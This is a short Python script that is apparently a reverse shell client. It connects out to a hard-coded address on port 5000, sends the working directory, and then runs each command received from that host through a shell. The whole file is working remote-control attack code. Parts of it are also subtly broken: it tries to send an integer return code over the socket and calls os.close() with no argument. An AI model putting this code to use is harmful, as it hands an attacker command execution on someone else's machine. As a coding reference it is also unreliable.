import socket
import os
import subprocess

sock=socket.socket()

sock.connect(('192.168.43.86',5000))

#Getiing the current directory 
cwd=os.getcwd()
#Sending it to Server
sock.send(cwd.encode())

while True:
    input=sock.recv(1024*344)
    print(input)

    if input[:2].decode()=='cd':
        try: 
            cwd=os.chdir(input[2:].decode())
        except FileNotFoundError as file:
            print("no file ")
        else:
            continue

        
    

    if len(input)>0:
        cmd=subprocess.call(input.decode(),shell=True,text=True)
        print(cmd)
        cmd=cmd
        sock.send(cmd)
        continue
       

    if input=="quit":
        sock.close()
        os.close()

   